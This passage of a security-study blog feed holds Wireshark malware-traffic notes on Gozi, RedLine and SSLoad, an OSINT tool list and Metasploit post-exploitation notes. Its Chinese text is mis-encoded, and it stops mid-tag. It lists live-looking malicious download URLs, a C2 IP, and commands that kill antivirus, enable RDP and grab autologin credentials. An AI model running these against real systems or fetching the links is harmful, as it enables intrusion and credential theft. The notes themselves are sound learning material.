    <content type="html"><![CDATA[<h1 id="Unit-42-Wireshark-Quiz-March-2023"><a href="#Unit-42-Wireshark-Quiz-March-2023" class="headerlink" title="Unit 42 Wireshark Quiz, March 2023"></a>Unit 42 Wireshark Quiz, March 2023</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="è¯·æ±‚æµ"><a href="#è¯·æ±‚æµ" class="headerlink" title="è¯·æ±‚æµ"></a>è¯·æ±‚æµ</h3><p>é¦–å…ˆçœ‹ä¸€ä¸‹è¯·æ±‚æµéƒ½æœ‰å•¥ä¸œè¥¿<br><img src="/images/202303-Malware/image.png"><br>å‘ç°ä¸€ä¸ªè¯·æ±‚<br><img src="/images/202303-Malware/image-1.png"><br>è¿½è¸ªåå…¶è¯·æ±‚äº†<code>zip</code>æ–‡ä»¶<br><img src="/images/202303-Malware/image-2.png"></p><h3 id="ZIPæ–‡ä»¶åˆ†æ"><a href="#ZIPæ–‡ä»¶åˆ†æ" class="headerlink" title="ZIPæ–‡ä»¶åˆ†æ"></a><code>ZIP</code>æ–‡ä»¶åˆ†æ</h3><p>åœ¨è™šæ‹Ÿæœºä¸­å°†<code>zip</code>æ–‡ä»¶å¯¼å‡º<br><img src="/images/202303-Malware/image-3.png"><br>å…¶æ–‡ä»¶å†…åŒ…å«äº†ä¸€ä¸ª<code>URI</code>ï¼Œè¯¥<code>URI</code>æ˜¯ä»¥<code>file</code>ä¸ºå¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿ<code>SMB</code>æµé‡<br><img src="/images/202303-Malware/image-4.png"></p><h3 id="SMBæµé‡åˆ†æ"><a href="#SMBæµé‡åˆ†æ" class="headerlink" title="SMBæµé‡åˆ†æ"></a><code>SMB</code>æµé‡åˆ†æ</h3><p>é‚£å°±å¯¼å‡º<code>SMB</code>æµé‡ä¼ è¾“çš„æ–‡ä»¶ï¼Œå‘ç°æ–‡ä»¶å¹¶ä¸æ˜¯å®Œå…¨çš„ï¼Œé‚£å°±æ— æ³•åˆ†æ<br><img src="/images/202303-Malware/image-5.png"></p><h3 id="æ„ŸæŸ“æµé‡åˆ†æ"><a href="#æ„ŸæŸ“æµé‡åˆ†æ" class="headerlink" title="æ„ŸæŸ“æµé‡åˆ†æ"></a>æ„ŸæŸ“æµé‡åˆ†æ</h3><p>æŸ¥çœ‹åœ¨è¯·æ±‚<code>ZIP</code>æ–‡ä»¶ä¹‹åçš„HTTPæµé‡ï¼Œå‘ç°å…¶åˆè¯·æ±‚äº†å››ä¸ª<code>rar</code>æ–‡ä»¶<br><img src="/images/202303-Malware/image-6.png"><br>æµè¢«åŠ å¯†ï¼Œæ— æ³•æŸ¥çœ‹ï¼Œä¸”ä¼ è¾“çš„æ˜¯åŠ å¯†è¿‡çš„äºŒè¿›åˆ¶æ–‡ä»¶<br><img src="/images/202303-Malware/image-7.png"></p><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://unit42.paloaltonetworks.com/march-wireshark-gozi-answers/">Finding Gozi: Answers to Unit 42 Wireshark Quiz, March 2023</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Unit-42-Wireshark-Quiz-March-2023&quot;&gt;&lt;a href=&quot;#Unit-42-Wireshark-Quiz-March-2023&quot; class=&quot;headerlink&quot; title=&quot;Unit 42 Wireshark Quiz, March 2023&quot;&gt;&lt;/a&gt;Unit 42 Wireshark Quiz, March 2023&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Crossing the Line - Unit 42 Wireshark Quiz for RedLine Stealer</title>
    <link href="https://2in9ya2.github.io/202307-Malware/"/>
    <id>https://2in9ya2.github.io/202307-Malware/</id>
    <published>2024-04-28T02:16:20.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unit-42-Wireshark-Quiz-for-RedLine-Stealer"><a href="#Unit-42-Wireshark-Quiz-for-RedLine-Stealer" class="headerlink" title="Unit 42 Wireshark Quiz for RedLine Stealer"></a>Unit 42 Wireshark Quiz for RedLine Stealer</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><p>æŸ¥çœ‹ä¸»æœºå<br><img src="/images/202307-Malware/image-1.png"></p><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆæŸ¥çœ‹<code>HTTP</code></p><p><img src="/images/202307-Malware/image.png"></p><p>å‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿</p><p><img src="/images/202307-Malware/image-2.png"></p><h3 id="å…¶ä»–TCP"><a href="#å…¶ä»–TCP" class="headerlink" title="å…¶ä»–TCP"></a>å…¶ä»–TCP</h3><p>åˆ©ç”¨å‘½ä»¤<code>tcp.flags eq 0x002 and !(tcp.port eq 443) and !(tcp.port eq 80) and !(ip.dst == 10.7.10.0/24)</code>æŸ¥çœ‹ç›®çš„åœ°å€éå±€åŸŸç½‘çš„<code>SYN</code>åŒ…</p><p><img src="/images/202307-Malware/image-3.png"></p><p>å‘ç°C2æœåŠ¡å™¨è¦æ±‚å—å®³è€…ä¸»å¥æä¾›å„ç§ç±»å‹çš„ç”¨æˆ·ä¿¡æ¯</p><p><img src="/images/202307-Malware/image-4.png"></p><p><img src="/images/202307-Malware/image-5.png"></p><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„<code>KEY</code></p><p><img src="/images/202307-Malware/image-6.png"></p><p>å—å®³è€…ä¸»æœºä¼ è¾“<code>png</code>å›¾ç‰‡</p><p><img src="/images/202307-Malware/image-7.png"></p><p>å°†æ•°æ®ä¸‹è½½ï¼ŒæŸ¥çœ‹å›¾ç‰‡ä¸º</p><p><img src="/images/202307-Malware/image-8.png"></p><p>è¿˜ä¼ è¾“äº†è¿›ç¨‹ä¿¡æ¯ï¼Œä¸»æœºé…ç½®ï¼Œä»¥åŠä¸€äº›ç™»å½•å‡­è¯<br><img src="/images/202307-Malware/image-9.png"></p><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://unit42.paloaltonetworks.com/wireshark-quiz-redline-stealer-answers/">Crossing the Line: Unit 42 Wireshark Quiz for RedLine Stealer</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Unit-42-Wireshark-Quiz-for-RedLine-Stealer&quot;&gt;&lt;a href=&quot;#Unit-42-Wireshark-Quiz-for-RedLine-Stealer&quot; class=&quot;headerlink&quot; title=&quot;Unit 42 Wireshark Quiz for RedLine Stealer&quot;&gt;&lt;/a&gt;Unit 42 Wireshark Quiz for RedLine Stealer&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>OSINT</title>
    <link href="https://2in9ya2.github.io/OSINT/"/>
    <id>https://2in9ya2.github.io/OSINT/</id>
    <published>2024-04-20T06:09:55.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><span id="more"></span><h2 id="æ”¶é›†åŸŸåä¿¡æ¯"><a href="#æ”¶é›†åŸŸåä¿¡æ¯" class="headerlink" title="æ”¶é›†åŸŸåä¿¡æ¯"></a>æ”¶é›†åŸŸåä¿¡æ¯</h2><p><code>sublist3r</code>åˆ©ç”¨<code>OSINT</code>æŠ€æœ¯æšä¸¾ä¸»åŸŸåçš„æ‰€æœ‰å­åŸŸå</p><p><img src="/images/OSINT/image.png"></p><p><code>Maltego</code>æå–äº’è”ç½‘ä¸Šå…¬å¼€èµ„æ–™æ¥æ”¶é›†ä¸ªäººä¿¡æ¯</p><p><code>OSRFramework</code>ç”¨äºæ‰§è¡Œå¼€æºæƒ…æŠ¥è®¡åˆ’çš„å·¥å…·</p><ul><li><code>usufy</code>ç”¨äºå¤šæœç´¢å¼•æ“æœç´¢ã€è¯†åˆ«<code>URL</code>ä¸­çš„å…³é”®å­—ï¼Œå¹¶è‡ªåŠ¨åˆ—ä¸¾å’Œ<code>CSV</code>æ ¼å¼å­˜å‚¨æ‰€æœ‰ç»“æœ</li><li><code>mailfy</code>é€šè¿‡<code>API</code>è°ƒç”¨åœ¨<code>havaibeenpawned.com</code>è‡ªåŠ¨æœç´¢</li><li><code>searchfy</code>åœ¨<code>Facebook</code>ã€<code>Github</code>ã€<code>Instagram</code>ã€<code>Twitter</code>å’Œ<code>Youtube</code>ä¸­æœç´¢å…³é”®è¯</li><li><code>Passive Total</code>é’ˆå¯¹ä»»ä½•ç‰¹å®šç›®æ ‡åŸŸåæä¾›<code>OSINT</code>èƒ½åŠ›çš„å¦ä¸€ä¸ªå¹³å°</li></ul><h2 id="ç½‘ç»œçˆ¬è™«"><a href="#ç½‘ç»œçˆ¬è™«" class="headerlink" title="ç½‘ç»œçˆ¬è™«"></a>ç½‘ç»œçˆ¬è™«</h2><ul><li><code>theHarvester</code>è„šæœ¬ï¼Œè¿›è¡Œæœç´¢</li></ul><p><img src="/images/OSINT/image-1.png"></p><h3 id="è·å–ç”¨æˆ·ä¿¡æ¯"><a href="#è·å–ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="è·å–ç”¨æˆ·ä¿¡æ¯"></a>è·å–ç”¨æˆ·ä¿¡æ¯</h3><ul><li><code>TinEye</code>æä¾›åœ¨çº¿åå‘å›¾åƒæœç´¢é—¨æˆ·ç½‘ç«™</li><li><code>Shodan</code></li><li><code>SpiderFoot</code></li><li><code>Spyse</code></li><li><code>ZoomEye</code></li></ul><h3 id="Google-Hacking-æ•°æ®åº“"><a href="#Google-Hacking-æ•°æ®åº“" class="headerlink" title="Google Hacking æ•°æ®åº“"></a>Google Hacking æ•°æ®åº“</h3><h3 id="ç”¨æˆ·å¯†ç åˆ—è¡¨"><a href="#ç”¨æˆ·å¯†ç åˆ—è¡¨" class="headerlink" title="ç”¨æˆ·å¯†ç åˆ—è¡¨"></a>ç”¨æˆ·å¯†ç åˆ—è¡¨</h3><p><code>cupp</code>ç”Ÿæˆå¯†ç å­—å…¸</p><h3 id="è‡ªå®šä¹‰å¯†ç ç ´è§£å­—å…¸"><a href="#è‡ªå®šä¹‰å¯†ç ç ´è§£å­—å…¸" class="headerlink" title="è‡ªå®šä¹‰å¯†ç ç ´è§£å­—å…¸"></a>è‡ªå®šä¹‰å¯†ç ç ´è§£å­—å…¸</h3><p><code>CeWL</code>ç»™å®š<code>URL</code>è¿›è¡ŒæŒ‡å®šæ·±åº¦çš„çˆ¬å–ï¼Œè¿”å›ä¸€ä¸ªå­—å…¸åˆ—è¡¨ç”¨äºå¯†ç ç ´è§£</p><p><code>twofi</code>ä»<code>Twitter</code>æå–å­—å…¸</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;OSINT&quot;&gt;&lt;a href=&quot;#OSINT&quot; class=&quot;headerlink&quot; title=&quot;OSINT&quot;&gt;&lt;/a&gt;OSINT&lt;/h1&gt;</summary>
    
    
    
    <category term="penetration_test" scheme="https://2in9ya2.github.io/categories/penetration-test/"/>
    
    
    <category term="study" scheme="https://2in9ya2.github.io/tags/study/"/>
    
    <category term="penetration test" scheme="https://2in9ya2.github.io/tags/penetration-test/"/>
    
  </entry>
  
  <entry>
    <title>CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11</title>
    <link href="https://2in9ya2.github.io/20240415-Malware/"/>
    <id>https://2in9ya2.github.io/20240415-Malware/</id>
    <published>2024-04-17T12:30:44.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11"><a href="#2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11" class="headerlink" title="2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11"></a>2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11</h1><span id="more"></span><p>è¯¥æµé‡ä¸ºæ„ŸæŸ“æµé‡</p><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆçœ‹åˆ°<code>HTTP</code>ä¸ºä¸»è¦æµé‡ï¼Œä¸”<code>UA</code>ä¸º<code>SSLoad</code>ä¹Ÿå°±æ˜¯é¢˜ç›®æ‰€æå‡ºçš„<code>SSLOAD</code>æ¶æ„è½¯ä»¶ï¼Œå¯ä»¥çœ‹å‡ºå…¶å‘<code>HOST</code>ä¸º<code>85.239.53.219</code>å‘å‡ºè¯·æ±‚ï¼Œå“åº”äº†<code>crypted_dll.bin</code>äºŒè¿›åˆ¶æ–‡ä»¶<br><img src="/images/20240415-Malware/image.png"><br>éšåå—å®³ä¸»æœºä¾¿<code>POST</code>è‡ªèº«<code>IP</code>ã€åŸŸåã€ç³»ç»Ÿä¿¡æ¯ç­‰<br><img src="/images/20240415-Malware/image-1.png"><br>éšååˆè¿›è¡Œäº†ä¸€ç³»åˆ—åŠ¨ä½œåï¼Œä¾¿ä¿æŒè¿æ¥<br><img src="/images/20240415-Malware/image-2.png"></p><p><img src="/images/20240415-Malware/image-3.png"></p><h3 id="åŸä½œè€…åˆ†æè®°å½•"><a href="#åŸä½œè€…åˆ†æè®°å½•" class="headerlink" title="åŸä½œè€…åˆ†æè®°å½•"></a>åŸä½œè€…åˆ†æè®°å½•</h3><p>INFECTION CHAIN:</p><ul><li>email generated by contact form of targeted organizationâ€™s website â€“&gt; URL from email â€“&gt; fake Azure page â€“&gt; Firebase URL â€“&gt; downloaded .js file â€“&gt; user double-clicks .js file, which is run by wscript.exe â€“&gt; downloads and runs .msi hosted on WebDAV server â€“&gt; .msi installs and runs SSLoad malware â€“&gt; SSLoad malware loads and runs encrypted payload â€“&gt; post-infection checkin traffic</li></ul><p>EXAMPLE OF URL FROM CONTACT FORM EMAIL SUBMITTED TO VIRUSTOTAL:</p><ul><li><a href="http://mmtixmm.org/65629679a60671570e93799683b05/case49308469q2097/court/out/367910732497/documents?t017538i87=0535008152&i=qz&dmc=www.scotchblue.com&4666842q3&cmp=horvitzlevy&4721702y0">http://mmtixmm.org/65629679a60671570e93799683b05/case49308469q2097/court/out/367910732497/documents?t017538i87=0535008152&amp;i=qz&amp;dmc=www.scotchblue.com&amp;4666842q3&amp;cmp=horvitzlevy&amp;4721702y0</a></li></ul><p>ASSOCIATED FAKE AZURE DOWNLOAD PAGE:</p><ul><li><a href="https://mebumau.org/?4666842q3&4721702y0&cmp=horvitzlevy&dmc=www.scotchblue.com&i=qz&t017538i87=0535008152">https://mebumau.org/?4666842q3&amp;4721702y0&amp;cmp=horvitzlevy&amp;dmc=www.scotchblue.com&amp;i=qz&amp;t017538i87=0535008152</a></li></ul><p>EXAMPLES OF FIREBASESTORAGE URLS FOR JS DOWNLOAD:</p><ul><li><p><a href="https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/I3Hl2Mxyqs%2FLetter_b23_98b161159-63t511248325-3676a8.js?alt=media&token=a097d607-7759-4aaa-b6e2-bfe5c43df76e">https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/I3Hl2Mxyqs%2FLetter_b23_98b161159-63t511248325-3676a8.js?alt=media&amp;token=a097d607-7759-4aaa-b6e2-bfe5c43df76e</a></p></li><li><p><a href="https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/VbxHHBQUee%2FLetter_u79_20w517865-65u0451500340-7186n6.js?alt=media&token=41e2b597-6b12-448a-92d1-9c770c818489">https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/VbxHHBQUee%2FLetter_u79_20w517865-65u0451500340-7186n6.js?alt=media&amp;token=41e2b597-6b12-448a-92d1-9c770c818489</a></p></li></ul><p>SHA256 EXAMPLES OF DOWNLOADED .JS FILES:</p><ul><li>93a215b08cce42249341816df7a85edac12d4bcef166b15da64bb238637f6e76  Letter_b23_98b161159-63t511248325-3676a8.js</li><li>5fb093a9348fcf4a81befda978c948796a8319fcabe7899c2cf5ba1419ec9d35  Letter_u79_20w517865-65u0451500340-7186n6.js</li></ul><p>ABOVE .JS FILES RETRIEVE MSI FILE FROM THE FOLLOWING URL:</p><ul><li>file:\globalsolutionunlimitedltd.com@80\share\sharepoint.msi</li></ul><p>DOWNLOADED MSI FILE:</p><ul><li>SHA256 hash: 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750</li><li>File size: 1,725,952 bytes</li><li>File location: file:\globalsolutionunlimitedltd.com@80\share\sharepoint.msi  &lt;â€“ No longer online</li><li>Sample available at: <a href="https://bazaar.abuse.ch/sample/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750/">https://bazaar.abuse.ch/sample/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750/</a></li></ul><p>SSLOAD DLL INSTALLED AND RUN BY THE ABOVE MSI FILE:</p><ul><li>SHA256 hash: 09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c</li><li>File size: 718.848 bytes</li><li>File location: C:\Users[username]\AppData\Local\sharepoint\MenuEx.dll</li><li>Run method: regsvr32.exe &#x2F;s [filename]</li><li>Sample available at: <a href="https://bazaar.abuse.ch/sample/09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c/">https://bazaar.abuse.ch/sample/09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c/</a></li><li>Note: This malware is kept persistent by a scheduled task.</li></ul><p>POST-INFECTION TRAFFIC:</p><ul><li><a href="https://t.me/+st2YadnCIU1iNmQy">https://t.me/+st2YadnCIU1iNmQy</a></li><li>85.239.53.219 port 80 - 85.239.53.219 - GET &#x2F;api&#x2F;g  &lt;â€“ encrypted payload</li><li>port 443 - api.ipify.org - HTTPS traffic</li><li>85.239.53.219 port 80 - 85.239.53.219 - POST &#x2F;api&#x2F;gateway HTTP&#x2F;1.1 , JSON (application&#x2F;json)</li><li>85.239.53.219 port 80 - 85.239.53.219 - POST &#x2F;api&#x2F;b0408631-d621-61e4-7035-f7d17fc50af8&#x2F;tasks HTTP&#x2F;1.1 </li><li>85.239.53.219 port 80 - 85.239.53.219 - GET &#x2F;download?id&#x3D;Cosmos&amp;module&#x3D;2&amp;filename&#x3D;None HTTP&#x2F;1.1</li></ul><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11&quot;&gt;&lt;a href=&quot;#2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11&quot; class=&quot;headerlink&quot; title=&quot;2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11&quot;&gt;&lt;/a&gt;2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Post-exploitation attack</title>
    <link href="https://2in9ya2.github.io/Post-exploitation-attack-privilege-escalation/"/>
    <id>https://2in9ya2.github.io/Post-exploitation-attack-privilege-escalation/</id>
    <published>2024-04-15T09:04:23.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><span id="more"></span><p>çºµå‘ææƒ <code>and</code> æ¨ªå‘ææƒ<br><code>Windows</code>å‘½ä»¤è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">whoami /groups</span><br></pre></td></tr></table></figure><p>å½“å‰ç»„ä¸º<code>Mandatory Label\Medium Mandatory Level</code>ï¼Œä¸ºæ ‡å‡†ç”¨æˆ·<br><img src="/images/Post-exploitation-attack-privilege-escalation/image.png"><br>é‚£ä¹ˆå°±éœ€è¦å‡åˆ°ç®¡ç†å‘˜æƒé™ï¼Œä¹Ÿå°±æ˜¯<code>Mandatory Lable\High  Mandatory Level</code></p><p><code>getuid</code>æŸ¥çœ‹å·²ç»è·å¾—çš„æƒé™</p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-1.png"></p><p>å¹¶å°è¯•ä½¿ç”¨<code>getsystem</code>å‘ç°å¤±è´¥äº†</p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-2.png"></p><p>è¿›å…¥<code>shell</code>ä½¿ç”¨<code>systeminfo</code>çœ‹çœ‹æ‰“äº†å“ªäº›è¡¥ä¸</p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-3.png"></p><p>å°½é‡ä½¿ç”¨æœ€æ–°çš„çš„<code>EXP</code>è¿›è¡Œææƒ<br><img src="/images/Post-exploitation-attack-privilege-escalation/image-4.png"></p><p><code>show options</code></p><p><img src="/images/Post-exploitation-attack-privilege-escalation/image-5.png"></p><p><code>set session 1</code><br><img src="/images/Post-exploitation-attack-privilege-escalation/image-6.png"></p><p>è²Œä¼¼æ²¡æˆåŠŸ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Privilege-escalation&quot;&gt;&lt;a href=&quot;#Privilege-escalation&quot; class=&quot;headerlink&quot; title=&quot;Privilege escalation&quot;&gt;&lt;/a&gt;Privilege escalation&lt;/h1&gt;</summary>
    
    
    
    <category term="penetration_test" scheme="https://2in9ya2.github.io/categories/penetration-test/"/>
    
    
    <category term="study" scheme="https://2in9ya2.github.io/tags/study/"/>
    
    <category term="penetration test" scheme="https://2in9ya2.github.io/tags/penetration-test/"/>
    
  </entry>
  
  <entry>
    <title>Post-exploitation attack</title>
    <link href="https://2in9ya2.github.io/Post-exploitation-attack-information-gathering/"/>
    <id>https://2in9ya2.github.io/Post-exploitation-attack-information-gathering/</id>
    <published>2024-04-15T07:20:19.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Information-gathering"><a href="#Information-gathering" class="headerlink" title="Information gathering"></a>Information gathering</h1><span id="more"></span><h2 id="è¿›ç¨‹è¿ç§»"><a href="#è¿›ç¨‹è¿ç§»" class="headerlink" title="è¿›ç¨‹è¿ç§»"></a>è¿›ç¨‹è¿ç§»</h2><p>åœ¨è·å¾—<code>Meterpreter Shell</code>åï¼Œå¦‚ä½•è¿›è¡Œä¸‹ä¸€æ­¥</p><p>ä½¿ç”¨å‘½ä»¤<code>ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</p><p>ä½¿ç”¨<code>getpid</code>æŸ¥çœ‹<code>Meterpreter Shell</code>çš„è¿›ç¨‹å·</p><p>è¿›ç¨‹è¿ç§»ï¼šä¹‹åä½¿ç”¨<code>migrate</code>å‘½ä»¤å°†<code>Shell</code>ç§»åŠ¨åˆ°å…¶ä»–è¿›ç¨‹é‡Œé¢ï¼Œæˆ–è€…ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate </span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿè‡ªåŠ¨å¯»æ‰¾åˆé€‚çš„è¿›ç¨‹è¿›è¡Œè¿ç§»</p><h2 id="ç³»ç»Ÿå‘½ä»¤"><a href="#ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤"></a>ç³»ç»Ÿå‘½ä»¤</h2><p><code>sysinfo</code>å‘½ä»¤æŸ¥çœ‹ç›®æ ‡æœºçš„ç³»ç»Ÿä¿¡æ¯<br>ä½¿ç”¨<strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><p>æ¥æŸ¥çœ‹ç›®æ ‡æœºæ˜¯å¦è¿è¡Œå†è™šæ‹Ÿæœºä¸Š</p><p><strong>å‘½ä»¤</strong><code>idletime</code>æŸ¥çœ‹ç›®æ ‡æœºæœ€è¿‘è¿è¡Œæ—¶é—´</p><p><strong>å‘½ä»¤</strong><code>route</code>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</p><p><strong>å‘½ä»¤</strong><code>getuid</code>æŸ¥çœ‹å½“å‰ç›®æ ‡æœºå™¨ä¸Šå·²ç»æ¸—é€æˆåŠŸçš„ç”¨æˆ·å</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/killav</span><br></pre></td></tr></table></figure><p>å…³é—­ç›®æ ‡æœºç³»ç»Ÿæ€æ¯’è½¯ä»¶</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>å¯ç”¨ç›®æ ‡æœºçš„è¿œç¨‹æ¡Œé¢åè®® <code>3389</code>ç«¯å£</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/autoroute</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç›®æ ‡æœºæœ¬åœ°å­ç½‘æƒ…å†µ</p><p>ä½¿ç”¨<code>background</code>å°†<code>Meterpreter</code>ç»ˆç«¯éšè—åœ¨åå°ï¼Œä¹‹åä½¿ç”¨<code>route add</code>æ·»åŠ è·¯ç”±ï¼Œå¯ä»¥ä½¿ç”¨<code>route print</code>æŸ¥çœ‹</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure><p>åˆ—ä¸¾å½“å‰å¤šå°‘ç”¨æˆ·ç™»é™†äº†ç›®æ ‡æœº</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure><p>åˆ—ä¸¾è£…åœ¨ç›®æ ‡æœºä¸Šçš„åº”ç”¨</p><p><strong>å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows/gather/credentials/windows_autologin</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠ“å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç </p><p><strong>å±å¹•æˆªå›¾å‘½ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤</strong></p><figure class="highlight 